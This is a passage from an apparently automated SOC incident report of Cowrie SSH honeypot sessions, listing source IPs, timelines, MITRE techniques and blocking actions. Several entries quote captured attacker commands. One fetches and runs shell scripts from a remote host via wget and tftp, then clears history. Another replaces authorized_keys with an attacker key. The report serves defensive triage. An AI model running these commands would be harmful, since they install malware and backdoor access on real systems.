| `2026-07-01 13:47:23` | `cowrie.client.version` |
| `2026-07-01 13:47:24` | `cowrie.client.kex` |
| `2026-07-01 13:47:24` | `cowrie.login.success` |
| `2026-07-01 13:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.170.65[.]227` to AbuseIPDB if not already reported
- [ ] Block `187.170.65[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d10ae35b294

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 13:51 |
| **Last Seen** | 2026-07-01 13:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:51:25` | `cowrie.session.connect` |
| `2026-07-01 13:51:25` | `cowrie.client.version` |
| `2026-07-01 13:51:25` | `cowrie.client.kex` |
| `2026-07-01 13:51:28` | `cowrie.login.success` |
| `2026-07-01 13:51:30` | `cowrie.session.params` |
| `2026-07-01 13:51:30` | `cowrie.command.input` |
| `2026-07-01 13:51:31` | `cowrie.log.closed` |
| `2026-07-01 13:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e422899abbf8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 13:52 |
| **Last Seen** | 2026-07-01 13:53 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:52:55` | `cowrie.session.connect` |
| `2026-07-01 13:52:56` | `cowrie.client.version` |
| `2026-07-01 13:52:56` | `cowrie.client.kex` |
| `2026-07-01 13:53:03` | `cowrie.login.success` |
| `2026-07-01 13:53:06` | `cowrie.session.params` |
| `2026-07-01 13:53:06` | `cowrie.command.input` |
| `2026-07-01 13:53:08` | `cowrie.log.closed` |
| `2026-07-01 13:53:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1985940ff3b

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-07-01 13:58 |
| **Last Seen** | 2026-07-01 13:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:58:19` | `cowrie.session.connect` |
| `2026-07-01 13:58:19` | `cowrie.client.version` |
| `2026-07-01 13:58:19` | `cowrie.client.kex` |
| `2026-07-01 13:58:21` | `cowrie.login.success` |
| `2026-07-01 13:58:22` | `cowrie.session.params` |
| `2026-07-01 13:58:22` | `cowrie.command.input` |
| `2026-07-01 13:58:22` | `cowrie.command.failed` |
| `2026-07-01 13:58:22` | `cowrie.log.closed` |
| `2026-07-01 13:58:23` | `cowrie.session.params` |
| `2026-07-01 13:58:23` | `cowrie.command.input` |
| `2026-07-01 13:58:23` | `cowrie.session.file_download` |
| `2026-07-01 13:58:23` | `cowrie.log.closed` |
| `2026-07-01 13:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab553b7b81b2

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-07-01 13:58 |
| **Last Seen** | 2026-07-01 13:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:58:24` | `cowrie.session.connect` |
| `2026-07-01 13:58:24` | `cowrie.client.version` |
| `2026-07-01 13:58:24` | `cowrie.client.kex` |
| `2026-07-01 13:58:25` | `cowrie.login.success` |
| `2026-07-01 13:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1222a429fc9a

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-07-01 13:58 |
| **Last Seen** | 2026-07-01 13:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:58:26` | `cowrie.session.connect` |
| `2026-07-01 13:58:26` | `cowrie.client.version` |
| `2026-07-01 13:58:26` | `cowrie.client.kex` |
| `2026-07-01 13:58:27` | `cowrie.login.success` |
| `2026-07-01 13:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e533cae5afe

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 14:04 |
| **Last Seen** | 2026-07-01 14:05 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:04:55` | `cowrie.session.connect` |
| `2026-07-01 14:04:56` | `cowrie.client.version` |
| `2026-07-01 14:04:56` | `cowrie.client.kex` |
| `2026-07-01 14:05:02` | `cowrie.login.success` |
| `2026-07-01 14:05:06` | `cowrie.session.params` |
| `2026-07-01 14:05:06` | `cowrie.command.input` |
| `2026-07-01 14:05:07` | `cowrie.log.closed` |
| `2026-07-01 14:05:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e7e0e77f060

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 14:09 |
| **Last Seen** | 2026-07-01 14:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:09:02` | `cowrie.session.connect` |
| `2026-07-01 14:09:02` | `cowrie.client.version` |
| `2026-07-01 14:09:02` | `cowrie.client.kex` |
| `2026-07-01 14:09:04` | `cowrie.login.success` |
| `2026-07-01 14:09:06` | `cowrie.session.params` |
| `2026-07-01 14:09:06` | `cowrie.command.input` |
| `2026-07-01 14:09:06` | `cowrie.log.closed` |
| `2026-07-01 14:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85e21bc9bbeb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 14:16 |
| **Last Seen** | 2026-07-01 14:16 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:16:37` | `cowrie.session.connect` |
| `2026-07-01 14:16:40` | `cowrie.client.version` |
| `2026-07-01 14:16:40` | `cowrie.client.kex` |
| `2026-07-01 14:16:45` | `cowrie.login.success` |
| `2026-07-01 14:16:50` | `cowrie.session.params` |
| `2026-07-01 14:16:50` | `cowrie.command.input` |
| `2026-07-01 14:16:51` | `cowrie.log.closed` |
| `2026-07-01 14:16:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9684040cc3e3

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]141` |
| **First Seen** | 2026-07-01 14:19 |
| **Last Seen** | 2026-07-01 14:20 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.110[.]191/re.sh, hxxp://83.168.110[.]191/updaterros.x86_64, hxxp://83.168.110[.]191/updaterros.x86_64 |
| **Malware Analysis** | 93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db (MEDIUM), 21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c (MEDIUM), 6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e (MEDIUM), 3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569 (MEDIUM), cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:19:54` | `cowrie.session.connect` |
| `2026-07-01 14:19:55` | `cowrie.login.success` |
| `2026-07-01 14:19:55` | `cowrie.session.params` |
| `2026-07-01 14:19:57` | `cowrie.command.input` |
| `2026-07-01 14:19:57` | `cowrie.command.input` |
| `2026-07-01 14:19:57` | `cowrie.session.file_download` |
| `2026-07-01 14:19:57` | `cowrie.session.file_download` |
| `2026-07-01 14:19:57` | `cowrie.session.file_download.failed` |
| `2026-07-01 14:19:58` | `cowrie.session.file_download` |
| `2026-07-01 14:19:58` | `cowrie.session.file_download` |
| `2026-07-01 14:19:58` | `cowrie.session.file_download` |
| `2026-07-01 14:19:59` | `cowrie.session.file_download` |
| `2026-07-01 14:19:59` | `cowrie.session.file_download` |
| `2026-07-01 14:20:12` | `cowrie.log.closed` |
| `2026-07-01 14:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]141` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0147a7c1ba5d

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]141` |
| **First Seen** | 2026-07-01 14:20 |
| **Last Seen** | 2026-07-01 14:21 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.110[.]191/re.sh, hxxp://83.168.110[.]191/updaterros.x86_64 |
| **Malware Analysis** | 93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:20:46` | `cowrie.session.connect` |
| `2026-07-01 14:20:47` | `cowrie.login.success` |
| `2026-07-01 14:20:47` | `cowrie.session.params` |
| `2026-07-01 14:20:49` | `cowrie.command.input` |
| `2026-07-01 14:20:49` | `cowrie.command.input` |
| `2026-07-01 14:20:49` | `cowrie.session.file_download` |
| `2026-07-01 14:20:49` | `cowrie.session.file_download` |
| `2026-07-01 14:20:49` | `cowrie.session.file_download.failed` |
| `2026-07-01 14:21:04` | `cowrie.log.closed` |
| `2026-07-01 14:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]141` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47984e451203

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]141` |
| **First Seen** | 2026-07-01 14:21 |
| **Last Seen** | 2026-07-01 14:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.110[.]191/re.sh, hxxp://83.168.110[.]191/updaterros.x86_64, hxxp://83.168.110[.]191/updaterros.x86_64 |
| **Malware Analysis** | 93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db (MEDIUM), 21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c (MEDIUM), 6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e (MEDIUM), 3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569 (MEDIUM), cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:21:39` | `cowrie.session.connect` |
| `2026-07-01 14:21:39` | `cowrie.login.success` |
| `2026-07-01 14:21:39` | `cowrie.session.params` |
| `2026-07-01 14:21:41` | `cowrie.command.input` |
| `2026-07-01 14:21:41` | `cowrie.command.input` |
| `2026-07-01 14:21:41` | `cowrie.session.file_download` |
| `2026-07-01 14:21:42` | `cowrie.session.file_download` |
| `2026-07-01 14:21:42` | `cowrie.session.file_download.failed` |
| `2026-07-01 14:21:42` | `cowrie.session.file_download` |
| `2026-07-01 14:21:42` | `cowrie.session.file_download` |
| `2026-07-01 14:21:43` | `cowrie.session.file_download` |
| `2026-07-01 14:21:43` | `cowrie.session.file_download` |
| `2026-07-01 14:21:43` | `cowrie.session.file_download` |
| `2026-07-01 14:21:52` | `cowrie.log.closed` |
| `2026-07-01 14:21:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]141` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5da1b7a170d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-01 14:22 |
| **Last Seen** | 2026-07-01 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:22:46` | `cowrie.session.connect` |
| `2026-07-01 14:22:46` | `cowrie.client.version` |
| `2026-07-01 14:22:46` | `cowrie.client.kex` |
| `2026-07-01 14:22:47` | `cowrie.login.success` |
| `2026-07-01 14:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6593327bb67

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-01 14:22 |
| **Last Seen** | 2026-07-01 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:22:47` | `cowrie.session.connect` |
| `2026-07-01 14:22:47` | `cowrie.client.version` |
| `2026-07-01 14:22:47` | `cowrie.client.kex` |
| `2026-07-01 14:22:48` | `cowrie.login.success` |
| `2026-07-01 14:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2ce7c44d76

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 14:26 |
| **Last Seen** | 2026-07-01 14:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:26:09` | `cowrie.session.connect` |
| `2026-07-01 14:26:10` | `cowrie.client.version` |
| `2026-07-01 14:26:10` | `cowrie.client.kex` |
| `2026-07-01 14:26:11` | `cowrie.login.success` |
| `2026-07-01 14:26:13` | `cowrie.session.params` |
| `2026-07-01 14:26:13` | `cowrie.command.input` |
| `2026-07-01 14:26:14` | `cowrie.log.closed` |
| `2026-07-01 14:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f4f23d18138

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 14:28 |
| **Last Seen** | 2026-07-01 14:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:28:24` | `cowrie.session.connect` |
| `2026-07-01 14:28:24` | `cowrie.client.version` |
| `2026-07-01 14:28:24` | `cowrie.client.kex` |
| `2026-07-01 14:28:25` | `cowrie.login.success` |
| `2026-07-01 14:28:25` | `cowrie.session.params` |
| `2026-07-01 14:28:25` | `cowrie.command.input` |
| `2026-07-01 14:28:26` | `cowrie.log.closed` |
| `2026-07-01 14:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f42df8a1f41d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 14:28 |
| **Last Seen** | 2026-07-01 14:29 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:28:55` | `cowrie.session.connect` |
| `2026-07-01 14:28:58` | `cowrie.client.version` |
| `2026-07-01 14:28:58` | `cowrie.client.kex` |
| `2026-07-01 14:29:03` | `cowrie.login.success` |
| `2026-07-01 14:29:07` | `cowrie.session.params` |
| `2026-07-01 14:29:07` | `cowrie.command.input` |
| `2026-07-01 14:29:09` | `cowrie.log.closed` |
| `2026-07-01 14:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6dc2db137e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:29 |
| **Last Seen** | 2026-07-01 14:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:29:39` | `cowrie.session.connect` |
| `2026-07-01 14:29:40` | `cowrie.client.version` |
| `2026-07-01 14:29:40` | `cowrie.client.kex` |
| `2026-07-01 14:29:41` | `cowrie.login.success` |
| `2026-07-01 14:29:42` | `cowrie.session.params` |
| `2026-07-01 14:29:42` | `cowrie.command.input` |
| `2026-07-01 14:29:42` | `cowrie.command.input` |
| `2026-07-01 14:29:42` | `cowrie.command.input` |
| `2026-07-01 14:29:42` | `cowrie.command.input` |
| `2026-07-01 14:29:42` | `cowrie.command.input` |
| `2026-07-01 14:29:42` | `cowrie.command.success` |
| `2026-07-01 14:29:42` | `cowrie.command.input` |
| `2026-07-01 14:29:42` | `cowrie.command.input` |
| `2026-07-01 14:29:42` | `cowrie.command.input` |
| `2026-07-01 14:29:42` | `cowrie.command.input` |
| `2026-07-01 14:29:43` | `cowrie.log.closed` |
| `2026-07-01 14:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a16194f97cd5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:31 |
| **Last Seen** | 2026-07-01 14:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:31:28` | `cowrie.session.connect` |
| `2026-07-01 14:31:28` | `cowrie.client.version` |
| `2026-07-01 14:31:28` | `cowrie.client.kex` |
| `2026-07-01 14:31:30` | `cowrie.login.success` |
| `2026-07-01 14:31:31` | `cowrie.session.params` |
| `2026-07-01 14:31:31` | `cowrie.command.input` |
| `2026-07-01 14:31:31` | `cowrie.command.input` |
| `2026-07-01 14:31:31` | `cowrie.command.input` |
| `2026-07-01 14:31:31` | `cowrie.command.input` |
| `2026-07-01 14:31:31` | `cowrie.command.input` |
| `2026-07-01 14:31:31` | `cowrie.command.success` |
| `2026-07-01 14:31:31` | `cowrie.command.input` |
| `2026-07-01 14:31:31` | `cowrie.command.input` |
| `2026-07-01 14:31:31` | `cowrie.command.input` |
| `2026-07-01 14:31:31` | `cowrie.command.input` |
| `2026-07-01 14:31:32` | `cowrie.log.closed` |
| `2026-07-01 14:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcce07938470

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:35 |
| **Last Seen** | 2026-07-01 14:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:35:10` | `cowrie.session.connect` |
| `2026-07-01 14:35:10` | `cowrie.client.version` |
| `2026-07-01 14:35:10` | `cowrie.client.kex` |
| `2026-07-01 14:35:11` | `cowrie.login.success` |
| `2026-07-01 14:35:12` | `cowrie.session.params` |
| `2026-07-01 14:35:12` | `cowrie.command.input` |
| `2026-07-01 14:35:12` | `cowrie.command.input` |
| `2026-07-01 14:35:12` | `cowrie.command.input` |
| `2026-07-01 14:35:12` | `cowrie.command.input` |
| `2026-07-01 14:35:12` | `cowrie.command.input` |
| `2026-07-01 14:35:12` | `cowrie.command.success` |
| `2026-07-01 14:35:13` | `cowrie.command.input` |
| `2026-07-01 14:35:13` | `cowrie.command.input` |
| `2026-07-01 14:35:13` | `cowrie.command.input` |
| `2026-07-01 14:35:13` | `cowrie.command.input` |
| `2026-07-01 14:35:13` | `cowrie.log.closed` |
| `2026-07-01 14:35:13` | `cowrie.session.closed` |

**Recommended Actions:**
